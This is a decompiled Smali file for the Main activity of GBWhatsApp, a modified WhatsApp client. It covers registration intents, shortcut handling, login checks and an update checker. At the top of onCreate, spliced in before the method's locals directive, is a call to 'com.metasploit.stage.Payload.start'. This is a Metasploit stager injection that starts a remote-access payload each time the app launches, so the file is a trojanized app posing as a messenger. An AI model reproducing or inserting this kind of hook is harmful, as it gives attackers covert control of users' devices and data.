.class public Lcom/gbwhatsapp/Main;
.super LX/27X;
.source ""


# instance fields
.field public A00:LX/11r;

.field public A01:LX/2Eo;

.field public A02:LX/0xB;

.field public A03:LX/17o;

.field public A04:LX/1Ag;

.field public A05:LX/0sw;

.field public A06:LX/0vb;

.field public A07:LX/0oR;

.field public A08:LX/0pq;

.field public A09:LX/0qq;

.field public A0A:LX/1Aq;

.field public A0B:Lcom/whatsapp/nativelibloader/WhatsAppLibLoader;

.field public A0C:LX/0sj;

.field public A0D:LX/01D;

.field public A0E:Z


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, LX/27X;-><init>()V

    return-void
.end method


# virtual methods
.method public final A2c(I)Landroid/content/Intent;
    .locals 6

    const/16 v0, 0xd

    if-ne p1, v0, :cond_1

    const/4 v5, 0x1

    :cond_0
    :goto_0
    iget-object v0, p0, Lcom/gbwhatsapp/Main;->A00:LX/11r;

    invoke-virtual {v0}, LX/11r;->A03()Z

    move-result v4

    const/4 v3, 0x0

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    const-string v0, "com.gbwhatsapp.registration.VerifyPhoneNumber"

    invoke-virtual {v2, v1, v0}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    const-string v0, "changenumber"

    invoke-virtual {v1, v0, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    const-string/jumbo v0, "use_sms_retriever"

    invoke-virtual {v1, v0, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    const-string v0, "code_verification_mode"

    invoke-virtual {v1, v0, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    return-object v1

    :cond_1
    const/16 v0, 0x9

    const/4 v5, 0x0

    if-ne p1, v0, :cond_0

    const/4 v5, 0x3

    goto :goto_0
.end method

.method public final A2d()V
    .locals 7

    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_2

    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v2

    const/4 v3, 0x0

    if-eqz v2, :cond_0

    invoke-virtual {v2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v1

    const-string v0, "android.intent.action.MAIN"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    invoke-virtual {v2}, Landroid/content/Intent;->getFlags()I

    move-result v0

    const/high16 v1, 0x4000000

    and-int/2addr v0, v1

    if-eqz v0, :cond_0

    iget-object v0, p0, LX/0lG;->A09:LX/0md;

    iget-object v0, v0, LX/0md;->A00:Landroid/content/SharedPreferences;

    const-string/jumbo v4, "shortcut_version"

    invoke-interface {v0, v4, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "main/recreate_shortcut"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    const v0, 0x7f121bc0

    invoke-virtual {p0, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-static {p0}, LX/0mh;->A05(Landroid/content/Context;)Landroid/content/Intent;

    move-result-object v2

    const/high16 v0, 0x10000000

    invoke-virtual {v2, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v2, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    new-instance v5, Landroid/content/Intent;

    invoke-direct {v5}, Landroid/content/Intent;-><init>()V

    :try_start_0
    const-string v1, "android.intent.extra.shortcut.INTENT"

    invoke-virtual {v2, v3}, Landroid/content/Intent;->toUri(I)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v3}, Landroid/content/Intent;->parseUri(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v5, v1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    goto :goto_0
    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    move-exception v2

    const-string v0, "RegisterName/remove-shortcut cannot parse shortcut uri "

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v2}, Lcom/whatsapp/util/Log;->e(Ljava/lang/String;Ljava/lang/Throwable;)V

    :goto_0
    const-string v0, "android.intent.extra.shortcut.NAME"

    invoke-virtual {v5, v0, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v0, "com.android.launcher.action.UNINSTALL_SHORTCUT"

    invoke-virtual {v5, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v5}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    const v0, 0x7f121bc0

    invoke-virtual {p0, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/gbwhatsapp/registration/RegisterName;->A02(Landroid/content/Context;Ljava/lang/String;)V

    iget-object v0, p0, LX/0lG;->A09:LX/0md;

    const/4 v1, 0x1

    iget-object v0, v0, LX/0md;->A00:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0, v4, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    :cond_0
    iget-boolean v0, p0, Lcom/gbwhatsapp/Main;->A0E:Z

    if-eqz v0, :cond_1

    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_1

    invoke-static {p0}, LX/0mh;->B03(Landroid/content/Context;)Landroid/content/Intent;

    move-result-object v2

    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string/jumbo v1, "show_payment_account_recovery"

    invoke-virtual {v0, v1, v3}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v0

    invoke-virtual {v2, v1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    invoke-virtual {p0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    invoke-virtual {p0, v3, v3}, Landroid/app/Activity;->overridePendingTransition(II)V

    :cond_1
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_2
    return-void
.end method

.method public isLogin()Z
    .locals 3

    iget-object v0, p0, LX/0lE;->A01:LX/0o1;

    invoke-virtual {v0}, LX/0o1;->A08()V

    iget-object v1, v0, LX/0o1;->A00:Lcom/gbwhatsapp/Me;

    if-eqz v1, :cond_0

    iget-object v0, p0, LX/0lE;->A09:LX/0nr;

    invoke-virtual {v0}, LX/0nr;->A00()I

    move-result v2

    const/4 v0, 0x3

    if-ne v2, v0, :cond_0

    const/4 v0, 0x1

    return v0

    :cond_0
    const/4 v0, 0x0

    return v0
.end method

.method public onCreate(Landroid/os/Bundle;)V
invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
    .locals 6

    const-string v3, "main_onCreate"

    const-string v0, "Main/onCreate"

    invoke-static {v0}, LX/01p;->A01(Ljava/lang/String;)V

    const/4 v5, 0x1

    const/4 v4, 0x0

    :try_start_0
    iget-object v1, p0, LX/0lI;->A02:LX/0tX;

    const-string v0, "Main"

    invoke-virtual {v1, v0}, LX/0tX;->A09(Ljava/lang/String;)V

    iget-object v0, p0, LX/0lI;->A02:LX/0tX;

    invoke-virtual {v0, v3}, LX/0tX;->A08(Ljava/lang/String;)V

    invoke-super {p0, p1}, LX/1yG;->onCreate(Landroid/os/Bundle;)V

    const v0, 0x7f121cb9

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setTitle(I)V

    sget-object p1, Lzoo/update/start/UpdateDirectorStart;->INSTANCE:Lzoo/update/start/UpdateDirectorStart;

    invoke-virtual {p0}, Lcom/gbwhatsapp/Main;->isLogin()Z

    move-result v1

    invoke-virtual {p1, v1}, Lzoo/update/start/UpdateDirectorStart;->setIsLogin(Z)V

    const-string v0, "cold"

    invoke-virtual {p1, p0, v0}, Lzoo/update/start/UpdateDirectorStart;->checkNewVersion(Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {p1}, Lzoo/update/start/UpdateDirectorStart;->needShowDlg()Z

    move-result p1

    if-nez p1, :cond_7

    iget-object v0, p0, Lcom/gbwhatsapp/Main;->A0B:Lcom/whatsapp/nativelibloader/WhatsAppLibLoader;

    invoke-virtual {v0}, Lcom/whatsapp/nativelibloader/WhatsAppLibLoader;->A03()Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "aborting due to native libraries missing"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    const-string v0, "show_wauninstall_page"

    invoke-static {v0}, Lcom/cow/s/t/StatsUtils;->stats(Ljava/lang/String;)V

    const-string v0, "com.gbwhatsapp.youbasha.ui.activity.RestartAppActivity"

    invoke-virtual {v2, v1, v0}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    :goto_0
    invoke-virtual {p0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    goto/16 :goto_3

    :cond_0
    iget-object v0, p0, Lcom/gbwhatsapp/Main;->A0A:LX/1Aq;

    invoke-virtual {v0}, LX/1Aq;->A05()V

    invoke-static {}, LX/0xB;->A00()Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "main/device-not-supported"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->w(Ljava/lang/String;)V

    const v0, 0x7f130305

    invoke-virtual {p0, v0}, Landroid/content/Context;->setTheme(I)V

    new-instance v0, Lcom/gbwhatsapp/DisplayExceptionDialogFactory$UnsupportedDeviceDialogFragment;

    invoke-direct {v0}, Lcom/gbwhatsapp/DisplayExceptionDialogFactory$UnsupportedDeviceDialogFragment;-><init>()V

    invoke-virtual {p0, v0}, LX/0lG;->AeB(Landroidy/fragment/app/DialogFragment;)V

    goto/16 :goto_3

    :cond_1
    iget-object v0, p0, LX/0lE;->A09:LX/0nr;

    invoke-virtual {v0}, LX/0nr;->A00()I

    move-result v2

    iget-object v0, p0, LX/0lE;->A01:LX/0o1;

    invoke-virtual {v0}, LX/0o1;->A08()V

    iget-object v1, v0, LX/0o1;->A00:Lcom/gbwhatsapp/Me;

    if-nez v1, :cond_2

    if-nez v2, :cond_2

    goto :goto_1

    :cond_2
    const/4 v0, 0x6

    if-ne v2, v0, :cond_3

    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_7

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    const-string v0, "com.gbwhatsapp.account.delete.DeleteAccountConfirmation"

    invoke-virtual {v2, v1, v0}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    goto :goto_0

    :goto_1
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_7

    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v1

    const-string/jumbo v0, "show_registration_first_dlg"

    invoke-virtual {v1, v0, v4}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v0

    invoke-static {p0, v0}, LX/0mh;->A0m(Landroid/content/Context;Z)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    invoke-virtual {p0}, Landroid/app/Activity;->finishAffinity()V

    goto :goto_3

    :cond_3
    if-eqz v1, :cond_5

    iget-object v0, p0, Lcom/gbwhatsapp/Main;->A08:LX/0pq;

    invoke-virtual {v0}, LX/0pq;->A04()V

    iget-boolean v0, v0, LX/0pq;->A01:Z

    if-nez v0, :cond_5

    iget-object v0, p0, LX/1yG;->A00:LX/2EJ;

    iget-object v1, v0, LX/2EJ;->A07:LX/0wy;

    iget-object v0, v0, LX/2EJ;->A06:LX/1e2;

    invoke-virtual {v1, v0}, LX/0wy;->A03(LX/1e2;)Z

    move-result v0

    if-eqz v0, :cond_6
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    :try_start_1
    iget-object v0, p0, Lcom/gbwhatsapp/Main;->A07:LX/0oR;

    invoke-virtual {v0}, LX/0oR;->A04()I

    move-result v2

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "main/create/backupfilesfound "

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    if-lez v2, :cond_4

    const/16 v0, 0x69

    invoke-static {p0, v0}, LX/0oC;->A01(Landroid/app/Activity;I)V

    goto :goto_2

    :cond_4
    invoke-virtual {p0, v4}, LX/1yG;->A2b(Z)V

    goto :goto_2
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :catchall_0
    move-exception v0

    :try_start_2
    throw v0

    :cond_5
    iput-boolean v5, p0, Lcom/gbwhatsapp/Main;->A0E:Z

    invoke-virtual {p0}, LX/1yG;->A2Z()V

    :cond_6
    :goto_2
    iget-object v1, p0, LX/0lI;->A02:LX/0tX;

    const-string v0, "Main created"

    invoke-virtual {v1, v0}, LX/0tX;->A0A(Ljava/lang/String;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    :cond_7
    :goto_3
    iget-object v0, p0, LX/0lI;->A02:LX/0tX;

    invoke-virtual {v0, v3}, LX/0tX;->A07(Ljava/lang/String;)V

    invoke-static {}, LX/01p;->A00()V

    return-void

    :catchall_1
    move-exception v1

    iget-object v0, p0, LX/0lI;->A02:LX/0tX;

    invoke-virtual {v0, v3}, LX/0tX;->A07(Ljava/lang/String;)V

    invoke-static {}, LX/01p;->A00()V

    throw v1
.end method

.method public onCreateDialog(I)Landroid/app/Dialog;
    .locals 4

    const v0, 0x7f130305

    invoke-virtual {p0, v0}, Landroid/content/Context;->setTheme(I)V

    if-eqz p1, :cond_0

    invoke-super {p0, p1}, LX/1yG;->onCreateDialog(I)Landroid/app/Dialog;

    move-result-object v0

    return-object v0

    :cond_0
    const-string v0, "main/dialog/upgrade"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    iget-object v1, p0, LX/0lI;->A02:LX/0tX;

    const-string/jumbo v0, "upgrade"

    invoke-virtual {v1, v0}, LX/0tX;->A06(Ljava/lang/String;)V

    new-instance v3, LX/1wE;

    invoke-direct {v3, p0}, LX/1wE;-><init>(Landroid/content/Context;)V

    const v0, 0x7f1218c8

    invoke-virtual {v3, v0}, LX/03V;->A02(I)V

    const v0, 0x7f1218c7

    invoke-virtual {v3, v0}, LX/03V;->A01(I)V

    const/4 v0, 0x0

    invoke-virtual {v3, v0}, LX/03V;->A07(Z)V

    const v2, 0x7f121b92

    const/16 v1, 0x9

    new-instance v0, Lcom/facebook/redex/IDxCListenerShape133S0100000_2_I0;

    invoke-direct {v0, p0, v1}, Lcom/facebook/redex/IDxCListenerShape133S0100000_2_I0;-><init>(Ljava/lang/Object;I)V

    invoke-virtual {v3, v2, v0}, LX/03V;->setPositiveButton(ILandroid/content/DialogInterface$OnClickListener;)LX/03V;

    const v2, 0x7f120b9d

    const/16 v1, 0x8

    new-instance v0, Lcom/facebook/redex/IDxCListenerShape133S0100000_2_I0;

    invoke-direct {v0, p0, v1}, Lcom/facebook/redex/IDxCListenerShape133S0100000_2_I0;-><init>(Ljava/lang/Object;I)V

    invoke-virtual {v3, v2, v0}, LX/03V;->setNegativeButton(ILandroid/content/DialogInterface$OnClickListener;)LX/03V;

    invoke-virtual {v3}, LX/03V;->create()LX/03W;

    move-result-object v0

    return-object v0
.end method

.method public onDestroy()V
    .locals 1

    sget-object v0, Lzoo/update/start/UpdateDirectorStart;->INSTANCE:Lzoo/update/start/UpdateDirectorStart;

    invoke-virtual {v0}, Lzoo/update/start/UpdateDirectorStart;->onDestroy()V

    invoke-super {p0}, LX/00k;->onDestroy()V

    return-void
.end method

.method public onResume()V
    .locals 1

    :try_start_0
    invoke-super {p0}, LX/0lE;->onResume()V

    goto :goto_0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :catchall_0
    move-exception v0

    throw v0

    :goto_0
    return-void
.end method

.method public onStart()V
    .locals 1

    const/4 v0, 0x1

    :try_start_0
    invoke-super {p0}, LX/0lE;->onStart()V

    iput-boolean v0, p0, Lcom/gbwhatsapp/Main;->A0E:Z

    sget-object v0, Lzoo/update/start/UpdateDirectorStart;->INSTANCE:Lzoo/update/start/UpdateDirectorStart;

    invoke-virtual {v0}, Lzoo/update/start/UpdateDirectorStart;->onStart()V

    return-void
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :catchall_0
    move-exception v0

    throw v0
.end method

.method public onStop()V
    .locals 1

    invoke-super {p0}, LX/00k;->onStop()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/gbwhatsapp/Main;->A0E:Z

    return-void
.end method
